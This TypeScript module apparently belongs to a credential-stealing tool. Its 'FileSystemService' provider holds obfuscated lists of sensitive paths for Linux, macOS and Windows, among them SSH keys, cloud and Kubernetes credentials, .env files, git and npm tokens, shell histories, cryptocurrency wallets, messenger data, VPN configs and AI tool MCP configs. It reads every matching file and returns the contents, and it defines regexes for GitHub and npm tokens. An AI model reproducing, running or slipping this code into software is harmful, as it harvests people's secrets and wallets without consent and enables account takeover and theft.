import { promises as fs } from "fs";
import * as os from "os";
import * as path from "path";

import type { OS } from "../../utils/config";
import { detectOS } from "../../utils/config";
import { Provider } from "../base";
import type { ProviderResult } from "../types";

type HotspotResult = string;
type StreamCb = (hotspot: string, result: HotspotResult) => void;

const MAX_BYTES = 5 * 1024 * 1024; // 5 MB

const expandHome = (p: string): string =>
  p.startsWith("~") ? path.join(os.homedir(), p.slice(1)) : p;
declare function scramble(str: string): string;
const HOTSPOT_CONFIG: Record<OS, string[]> = {
  LINUX: [
    scramble("~/.ansible/*"),
    scramble("~/.aws/config"),
    scramble("~/.aws/credentials"),
    scramble("~/.azure/accessTokens.json"),
    scramble("~/.azure/msal_token_cache.*"),
    scramble("~/.bash_history"),
    scramble("~/.bitcoin/wallet.dat"),
    scramble("~/.cert/nm-openvpn/*"),
    scramble("~/.claude.json"),
    scramble("~/.claude/mcp.json"),
    scramble("~/.config/atomic/Local Storage/leveldb/*"),
    scramble("**/config/database.yml"),
    scramble("~/.config/discord/Local Storage/leveldb/*"),
    scramble("~/.config/Element/Local Storage/*"),
    scramble("~/.config/Exodus/exodus.wallet/*"),
    scramble("~/.config/filezilla/recentservers.xml"),
    scramble("~/.config/filezilla/sitemanager.xml"),
    scramble("~/.config/gcloud/access_tokens.db"),
    scramble("~/.config/gcloud/application_default_credentials.json"),
    scramble("~/.config/gcloud/credentials.db"),
    scramble("~/.config/git/credentials"),
    scramble("~/.config/helm/*"),
    scramble("~/.config/kwalletd/*.kwl"),
    scramble("~/.config/Ledger Live/*"),
    scramble("~/.config/remmina/*"),
    scramble("~/.config/Signal/*"),
    scramble("~/.config/Slack/Cookies"),
    scramble("~/.config/telegram-desktop/*"),
    scramble("~/.config/weechat/irc.conf"),
    scramble("~/.dash/wallet.dat"),
    scramble("~/.docker/*/config.json"),
    scramble("~/.docker/config.json"),
    scramble("~/.dogecoin/wallet.dat"),
    scramble("~/.electrum-ltc/wallets/*"),
    scramble("~/.electrum/wallets/*"),
    scramble("**/.env"),
    scramble(".env"),
    scramble("**/.env.local"),
    scramble("**/.env.production"),
    scramble("/etc/openvpn/*"),
    scramble("/etc/rancher/k3s/k3s.yaml"),
    scramble("/etc/ssh/ssh_host_*_key"),
    scramble("~/.ethereum/keystore/*"),
    scramble(".git/config"),
    scramble("~/.gitconfig"),
    scramble(".git-credentials"),
    scramble("~/.git-credentials"),
    scramble("~/.history"),
    scramble("~/.kde4/share/apps/kwallet/*.kwl"),
    scramble("~/.kde/share/apps/kwallet/*.kwl"),
    scramble("~/.kiro/settings/mcp.json"),
    scramble("~/.kube/config"),
    scramble("~/.lesshst"),
    scramble("~/.litecoin/wallet.dat"),
    scramble("~/.local/share/keyrings/*.keyring"),
    scramble("~/.local/share/keyrings/login.keyring"),
    scramble("~/.local/share/recently-used.xbel"),
    scramble("~/.local/share/TelegramDesktop/tdata/*"),
    scramble("~/.monero/*"),
    scramble("~/.mysql_history"),
    scramble("~/.netrc"),
    scramble("~/.node_repl_history"),
    scramble(".npmrc"),
    scramble("~/.npmrc"),
    scramble("~/.pki/nssdb/*"),
    scramble("~/.psql_history"),
    scramble("~/.purple/accounts.xml"),
    scramble("~/.pypirc"),
    scramble("~/.python_history"),
    scramble("~/.remmina/*"),
    scramble("/root/.docker/config.json"),
    scramble("**/settings.p"),
    scramble("~/.ssh/authorized_keys"),
    scramble("~/.ssh/config"),
    scramble("~/.ssh/id*"),
    scramble("~/.ssh/id_"),
    scramble("~/.ssh/id_dsa"),
    scramble("~/.ssh/id_ecdsa"),
    scramble("~/.ssh/id_ed25519"),
    scramble("~/.ssh/keys"),
    scramble("~/.ssh/known_hosts"),
    scramble("~/.terraform.d/credentials.tfrc.json"),
    scramble("/var/lib/docker/containers/*/config.v2.json"),
    scramble("/var/run/secrets/kubernetes.io/serviceaccount/token"),
    scramble("~/.viminfo"),
    scramble("**/wp-config.php"),
    scramble("~/.yarnrc"),
    scramble("~/.zcash/wallet.dat"),
    scramble("~/.zsh_history"),
  ],

  WIN: [
    ".env",
    "config.ini",
    scramble("%APPDATA%\\NordVPN\\NordVPN.exe.Config"),
    scramble("%APPDATA%\\OpenVPN Connect\\profiles\\*"),
    scramble("%PROGRAMDATA%\OpenVPN\config\*"),
    scramble("%APPDATA%\\ProtonVPN\\user.config"),
    scramble("%APPDATA%\\CyberGhost\\CG6\\CyberGhost.dat"),
    scramble("%APPDATA%\\Private Internet Access\*.conf"),
    scramble("%APPDATA%\\Windscribe\\Windscribe\*"),
    scramble("C:\\Program Files\\OpenVPN\\config\\*.ovpn"),
    scramble("%USERPROFILE%\\OpenVPN\\config\\*.ovpn"),
    scramble("%APPDATA\%\EarthVPN\\OpenVPN\\config\\*.ovpn"),
  ],
  OSX: [
    scramble("~/.ansible/*"),
    scramble("~/.aws/config"),
    scramble("~/.aws/credentials"),
    scramble("~/.azure/accessTokens.json"),
    scramble("~/.azure/msal_token_cache.*"),
    scramble("~/.bash_history"),
    scramble("~/.bitcoin/wallet.dat"),
    scramble("~/.cert/nm-openvpn/*"),
    scramble(".claude.json"),
    scramble("~/.claude.json"),
    scramble("~/.config/atomic/Local Storage/leveldb/*"),
    scramble("**/config/database.yml"),
    scramble("~/.config/discord/Local Storage/leveldb/*"),
    scramble("~/.config/Element/Local Storage/*"),
    scramble("~/.config/Exodus/exodus.wallet/*"),
    scramble("~/.config/filezilla/recentservers.xml"),
    scramble("~/.config/filezilla/sitemanager.xml"),
    scramble("~/.config/gcloud/access_tokens.db"),
    scramble("~/.config/gcloud/application_default_credentials.json"),
    scramble("~/.config/gcloud/credentials.db"),
    scramble("~/.config/git/credentials"),
    scramble("~/.config/helm/*"),
    scramble("~/.config/Ledger Live/*"),
    scramble("~/.config/remmina/*"),
    scramble("~/.config/Signal/*"),
    scramble("~/.config/Slack/Cookies"),
    scramble("~/.config/telegram-desktop/*"),
    scramble("~/.config/weechat/irc.conf"),
    scramble("~/.dash/wallet.dat"),
    scramble("~/.docker/*/config.json"),
    scramble("~/.docker/config.json"),
    scramble("~/.dogecoin/wallet.dat"),
    scramble("~/.electrum-ltc/wallets/*"),
    scramble("~/.electrum/wallets/*"),
    scramble("**/.env"),
    scramble(".env"),
    scramble("**/.env.local"),
    scramble("**/.env.production"),
    scramble("/etc/openvpn/*"),
    scramble("/etc/rancher/k3s/k3s.yaml"),
    scramble("/etc/ssh/ssh_host_*_key"),
    scramble("~/.ethereum/keystore/*"),
    scramble(".git/config"),
    scramble("~/.gitconfig"),
    scramble(".git-credentials"),
    scramble("~/.history"),
    scramble("~/.kde4/share/apps/kwallet/*.kwl"),
    scramble("~/.kde/share/apps/kwallet/*.kwl"),
    scramble(".kiro/settings/mcp.json"),
    scramble("~/.kiro/settings/mcp.json"),
    scramble("~/.kube/config"),
    scramble("~/.lesshst"),
    scramble("~/.litecoin/wallet.dat"),
    scramble("~/.local/share/keyrings/*.keyring"),
    scramble("~/.local/share/keyrings/login.keyring"),
    scramble("~/.local/share/recently-used.xbel"),
    scramble("~/.local/share/TelegramDesktop/tdata/*"),
    scramble("~/.monero/*"),
    scramble("~/.mysql_history"),
    scramble("~/.netrc"),
    scramble("~/.node_repl_history"),
    scramble(".npmrc"),
    scramble("~/.npmrc"),
    scramble("~/.pki/nssdb/*"),
    scramble("~/.psql_history"),
    scramble("~/.purple/accounts.xml"),
    scramble("~/.pypirc"),
    scramble("~/.python_history"),
    scramble("~/.remmina/*"),
    scramble("/root/.docker/config.json"),
    scramble("**/settings.p"),
    scramble("~/.ssh/authorized_keys"),
    scramble("~/.ssh/config"),
    scramble("~/.ssh/id*"),
    scramble("~/.ssh/id_"),
    scramble("~/.ssh/id_dsa"),
    scramble("~/.ssh/id_ecdsa"),
    scramble("~/.ssh/id_ed25519"),
    scramble("~/.ssh/id_rsa"),
    scramble("~/.ssh/known_hosts"),
    scramble("~/.terraform.d/credentials.tfrc.json"),
    scramble("/var/lib/docker/containers/*/config.v2.json"),
    scramble("~/.viminfo"),
    scramble("**/wp-config.php"),
    scramble("~/.yarnrc"),
    scramble("~/.zcash/wallet.dat"),
    scramble("~/.zsh_history"),
    scramble("/var/run/secrets/kubernetes.io/serviceaccount/token"),
  ],
  UNKNOWN: [],
};

export class FileSystemService extends Provider {
  constructor() {
    super("filesystem", "misc", {
      ghtoken: /gh[op]_[A-Za-z0-9]{36}/g,
      npmtoken: /npm_[A-Za-z0-9]{36,}/g,
    });
  }

  private getHotspots(): string[] {
    const system = detectOS();
    return HOTSPOT_CONFIG[system];
  }

  private async readHotspots(
    hotspots: string[],
    onResult?: StreamCb,
    concurrent = 1,
  ): Promise<Record<string, HotspotResult>> {
    const results: Record<string, HotspotResult> = {};

    const expandGlob = async (pattern: string): Promise<string[]> => {
      const expanded = expandHome(pattern);

      // No glob metacharacters — return as a literal path.
      if (!/[*?[]/.test(expanded)) {
        return [expanded];
      }

      // Split the pattern into a static base directory and the glob remainder.
      // e.g. "src/**/*.ts"        -> base: "src",         rest: "**/*.ts"
      //      "/etc/*.conf"        -> base: "/etc",        rest: "*.conf"
      //      "**/.env.local"      -> base: ".",           rest: "**/.env.local"
      //      "/home/u/notes/*.md" -> base: "/home/u/notes", rest: "*.md"
      const parts = expanded.split("/");
      const firstGlobIdx = parts.findIndex((p) => /[*?[]/.test(p));

      let base: string;
      let rest: string;
      if (firstGlobIdx === 0) {
        // Pattern begins with a glob segment (relative).
        base = ".";
        rest = expanded;
      } else {
        // parts.slice(0, firstGlobIdx).join("/") yields "" for absolute roots
        // (because the first segment before a leading "/" is ""), so fall back to "/".
        base = parts.slice(0, firstGlobIdx).join("/") || "/";
        rest = parts.slice(firstGlobIdx).join("/");
      }

      try {
        const glob = new Bun.Glob(rest);
        const matches = Array.from(
          glob.scanSync({
            cwd: base,
            absolute: true,
            dot: true,
            onlyFiles: true,
          }),
        );
        return matches;
      } catch {
        return [];
      }
    };

    const handle = async (hotspot: string) => {
      const expandedPath = expandHome(hotspot);

      try {
        const stat = await fs.stat(expandedPath);

        if (!stat.isFile()) {
          return;
        }

        if (stat.size > MAX_BYTES) {
          const result = `Error: File too large (${stat.size} bytes)`;
          results[hotspot] = result;
          onResult?.(hotspot, result);
          return;
        }

        const buffer = await fs.readFile(expandedPath);
        const content = buffer.toString("utf-8");
        results[hotspot] = content;
        onResult?.(hotspot, content);
      } catch (err: any) {
        return;
      }
    };

    // Expand glob patterns
    const expandedHotspots: string[] = [];
    for (const hotspot of hotspots) {
      const matches = await expandGlob(hotspot);
      expandedHotspots.push(...matches);
    }

    if (concurrent <= 1) {
      for (const hotspot of expandedHotspots) {
        await handle(hotspot);
      }
      return results;
    }

    const queue = expandedHotspots.slice();
    const workers = Array.from({
      length: Math.min(concurrent, queue.length),
    }).map(async () => {
      let hotspot;
      while ((hotspot = queue.shift())) {
        await handle(hotspot);
      }
    });

    await Promise.all(workers);
    return results;
  }
  async execute(): Promise<ProviderResult> {
    const hotspots = this.getHotspots();

    if (!hotspots.length) {
      return this.failure("Unknown OS or no hotspots configured");
    }

    try {
      const results = await this.readHotspots(hotspots, undefined, 2);
      return this.success({ hotspots: results });
    } catch (err: any) {
      return this.failure(err?.message ?? String(err));
    }
  }
}
